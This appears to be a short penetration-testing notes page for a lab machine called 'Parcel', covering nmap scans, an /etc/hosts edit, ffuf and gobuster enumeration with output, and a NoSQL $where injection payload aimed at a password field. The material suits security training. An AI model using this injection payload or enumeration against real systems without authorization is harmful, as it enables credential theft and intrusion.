# Parcel

## Recon

Reusable recon commands were extracted into [silent-scan](../../../../tools/recon/silent-scan.md) and [nmap](../../../../tools/recon/nmap.md).

```bash
silent-scan $TARGET
nmap -sVC -p80 $TARGET -oN service
```
**Output**
```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.29.8
|_http-title: Did not follow redirect to http://app.gridmark.io/
|_http-server-header: nginx/1.29.8
```

## Add the vhost to hte host file 
```bash
echo "$TARGET app.gridmark.io gridmark.io" | sudo tee -a /etc/hosts
```

## Web Fuzz 

Tool note: [ffuf](../../../../tools/fuzz/ffuf.md).

```bash
ffuf -u http://app.gridmark.io/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt 
```

**Output**
```
account                 [Status: 302, Size: 271, Words: 18, Lines: 6, Duration: 122ms]
admin                   [Status: 302, Size: 267, Words: 18, Lines: 6, Duration: 184ms]
listings                [Status: 200, Size: 21409, Words: 7241, Lines: 517, Duration: 214ms]
login                   [Status: 200, Size: 2817, Words: 799, Lines: 90, Duration: 197ms]
logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 189ms]
market                  [Status: 200, Size: 12356, Words: 2283, Lines: 372, Duration: 213ms]
register                [Status: 200, Size: 3058, Words: 819, Lines: 91, Duration: 196ms]
saved                   [Status: 302, Size: 267, Words: 18, Lines: 6, Duration: 188ms]
search                  [Status: 200, Size: 15029, Words: 3204, Lines: 344, Duration: 199ms]
:: Progress: [4750/4750] :: Job [1/1] :: 221 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
```


## Vhost enumeration 

Tool note: [gobuster](../../../../tools/fuzz/gobuster.md).

```bash
gobuster vhost -u http://gridmark.io -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

## No SQL injection test in http://app.gridmark.io/account/searches in the json input

Technique: [NoSQL `$where` injection probe](../../../../exploits/web-disclosure/nosql-where-injection.md). Payload list: [NoSQL payloads](../../../../payloads/sql/NoSQL.txt).

```bash
{"$where": "this.password[0] == '123456'"}
```

## Related Notes

- [silent-scan](../../../../tools/recon/silent-scan.md)
- [nmap](../../../../tools/recon/nmap.md)
- [ffuf](../../../../tools/fuzz/ffuf.md)
- [gobuster](../../../../tools/fuzz/gobuster.md)
- [nosql-where-injection](../../../../exploits/web-disclosure/nosql-where-injection.md)
- [NoSQL payloads](../../../../payloads/sql/NoSQL.txt)
